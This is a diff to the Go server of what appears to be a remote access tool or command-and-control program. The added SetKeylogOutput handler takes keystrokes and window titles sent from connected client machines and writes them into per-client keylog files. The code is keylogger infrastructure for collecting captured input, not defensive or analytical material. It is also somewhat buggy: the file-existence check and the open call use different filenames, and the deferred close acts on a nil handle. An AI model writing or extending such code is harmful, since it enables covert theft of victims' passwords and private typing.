@@ -5,6 +5,7 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/json"
+	"fmt"
 	"log"
 	"net"
 	"os"
@@ -57,6 +58,8 @@ var client_execoutput map[string]string = make(map[string]string)
 var client_dialog map[string]string = make(map[string]string)
 var client_dialogoutput map[string]string = make(map[string]string)
 
+// var keylog_file map[string]
+
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
 ▒████▄     ██▄█▒ ▓██▒▓██▒    ▓  ██▒ ▓▒
@@ -70,6 +73,7 @@ var banner string = `
 `
 
 func main() {
+
 	go func() {
 		p := tea.NewProgram(initialModel(), tea.WithAltScreen())
 
@@ -212,6 +216,32 @@ func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.
 			client_dialogoutput[current_id] = in.GetEntryText()
 		}
 	}
+
+	return &pb.Void{}, nil
+}
+
+func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
+	if !Contains(client_ids, in.Id.ClientId) {
+		client_ids = append(client_ids, in.Id.ClientId)
+	}
+
+	var file *os.File
+
+	defer file.Close()
+
+	if _, err := os.Stat(fmt.Sprintf("keylog-%s", in.Id.ClientId)); os.IsNotExist(err) {
+		file, err = os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			return &pb.Void{}, err
+		}
+	}
+
+	file, err := os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return &pb.Void{}, err
+	}
+
+	file.WriteString(fmt.Sprintf("%s - %s\n", in.GetWindowTitle(), string(rune(in.GetKey()))))
 
 	return &pb.Void{}, nil
 }
